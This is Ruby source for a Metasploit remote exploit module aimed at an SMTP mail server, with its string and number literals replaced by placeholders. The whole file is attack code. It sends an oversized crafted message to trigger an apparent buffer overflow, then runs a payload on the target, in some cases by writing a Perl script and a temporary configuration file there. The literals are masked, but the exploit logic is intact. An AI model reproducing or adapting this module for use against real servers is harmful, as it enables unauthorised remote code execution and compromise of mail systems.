require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: Smtp def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > true , <str> = > { <str> = > true , <str> = > <int> , <str> = > { <str> = > <str> , <str> = > <str> , } } , <str> = > <str> , <str> = > ARCH_CMD , <str> = > [ [ <str> , { } ] , ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ false , <str> ] ) ] , self . class ) register_advanced_options ( [ OptString . new ( <str> , [ false , <str> ] ) , OptBool . new ( <str> , [ true , <str> , false ] ) , OptBool . new ( <str> , [ true , <str> , false ] ) ] , self . class ) end def exploit ehlo = datastore [ <str> ] ehlo || = Rex :: Text . rand_text_alphanumeric ( <int> ) + <str> print_status ( <str> rhost <str> rport <str> ) connect print_status ( <str> self . banner . to_s . strip <str> ) if self . banner . to_s !~ <str> disconnect fail_with ( Failure :: NoTarget , <str> ) end if not datastore [ <str> ] and self . banner !~ <str> fail_with ( Failure :: Unknown , <str> ) end ehlo_resp = raw_send_recv ( <str> ehlo <str> ) ehlo_resp . each_line do | line | print_status ( <str> line . strip <str> ) end max_msg = <int> if ehlo_resp . to_s =~ <str> max_msg = $1 . to_i end saddr = nil revdns = nil if ehlo_resp =~ <str> revdns = $1 saddr = $2 end source = saddr || datastore [ <str> ] || Rex :: Socket . source_address ( <str> ) print_status ( <str> revdns <str> source <str> ) from = datastore [ <str> ] to = datastore [ <str> ] resp = raw_send_recv ( <str> from <str> ) resp || = <str> msg = <str> resp . strip <str> if not resp or resp [ <int> , <int> ] != <str> fail_with ( Failure :: Unknown , msg ) else print_status ( msg ) end resp = raw_send_recv ( <str> to <str> ) resp || = <str> msg = <str> resp . strip <str> if not resp or resp [ <int> , <int> ] != <str> fail_with ( Failure :: Unknown , msg ) else print_status ( msg ) end resp = raw_send_recv ( <str> ) resp || = <str> msg = <str> resp . strip <str> if not resp or resp [ <int> , <int> ] != <str> fail_with ( Failure :: Unknown , msg ) else print_status ( msg ) end msg_len = max_msg + ( <int> * <int> ) log_buffer_size = <int> host_part = <str> if revdns and revdns != ehlo host_part << revdns << <str> end host_part << <str> ehlo <str> print_status ( <str> ) log_buffer = <str> from <str> host_part <str> source <str> log_buffer << <str> msg_len <str> max_msg <str> log_buffer << <str> from <str> to <str> log_buffer_size -= <int> hdrs = [ ] while log_buffer . length < log_buffer_size header_name = rand_text_alpha ( <int> ) . capitalize filler = rand_text_alphanumeric ( <int> * <int> ) hdr = <str> header_name <str> filler <str> one = ( <int> + hdr . length ) two = <int> * one left = log_buffer_size - log_buffer . length if left < two and left > one left -= <int> first = left / <int> hdr = hdr . slice ( <int> , first - <int> ) + <str> hdrs << hdr log_buffer << <str> << hdr second = left - first header_name = rand_text_alpha ( <int> ) . capitalize filler = rand_text_alphanumeric ( <int> * <int> ) hdr = <str> header_name <str> filler <str> hdr = hdr . slice ( <int> , second - <int> ) + <str> end hdrs << hdr log_buffer << <str> << hdr end hdrs1 = hdrs . join header_name = Rex :: Text . rand_text_alpha ( <int> ) . capitalize print_status ( <str> ) hdrx = <str> header_name <str> <int> . upto ( <int> ) { | a | <int> . upto ( <int> ) { | b | hdrx << <str> b <str> } } print_status ( <str> ) body = <str> fill = ( Rex :: Text . rand_text_alphanumeric ( <int> ) + <str> ) * <int> while ( body . length < msg_len ) body << fill end body = body [ <int> , msg_len ] print_status ( <str> msg_len / ( <int> * <int> ) <str> ) sock . put hdrs1 sock . put hdrx sock . put <str> sock . put body print_status ( <str> ) buf = raw_send_recv ( <str> ) print_status ( <str> buf . inspect <str> ) if buf second_result = <str> print_status ( <str> ) buf = raw_send_recv ( <str> datastore [ <str> ] <str> ) if buf print_status ( <str> buf . inspect <str> ) second_result << buf end buf = raw_send_recv ( <str> datastore [ <str> ] <str> ) if buf print_status ( <str> buf . inspect <str> ) second_result << buf end buf = sock . get_once ( - <int> , <int> . <int> ) second_result << buf if buf sock . put ( <str> ) buf = sock . get_once ( - <int> , <int> . <int> ) second_result << buf if buf if second_result !~ <str> print_error ( <str> second_result . inspect <str> ) fail_with ( Failure :: Unknown , <str> ) end resp = <str> if not datastore [ <str> ] print_status ( <str> ) sock . put ( <str> ) select ( nil , nil , nil , <int> . <int> ) resp = sock . get_once ( - <int> , <int> . <int> ) end if resp !~ <str> print_status ( <str> ) buf = raw_send_recv ( <str> + payload . encoded + <str> ) if buf if buf =~ <str> print_error ( <str> buf . strip <str> ) else print_status ( <str> buf . inspect <str> ) end end else print_status ( <str> ) token = Rex :: Text . rand_text_alpha ( <int> ) sock . get_once ( - <int> , <int> . <int> ) sock . put ( <str> token <str> ) buff = <str> cnt = while not buff . index ( token ) res = sock . get_once ( - <int> , <int> . <int> ) buff << res if res end perl_path = buff . gsub ( token , <str> ) . gsub ( <str> , <str> ) . strip print_status ( <str> perl_path <str> ) temp_conf = <str> + Rex :: Text . rand_text_alpha ( <int> ) temp_perl = <str> + Rex :: Text . rand_text_alpha ( <int> ) temp_eof = Rex :: Text . rand_text_alpha ( <int> ) print_status ( <str> temp_conf <str> temp_perl <str> ) data_conf = <str> perl_path <str> temp_perl <str> . unpack ( <str> ) [ <int> ] sock . put ( <str> data_conf <str> temp_conf <str> ) data_perl = <str> payload . encoded <str> . unpack ( <str> ) [ <int> ] sock . put ( <str> data_perl <str> temp_perl <str> ) print_status ( <str> ) sock . put ( <str> temp_conf <str> ) end select ( nil , nil , nil , <int> ) handler disconnect end end 
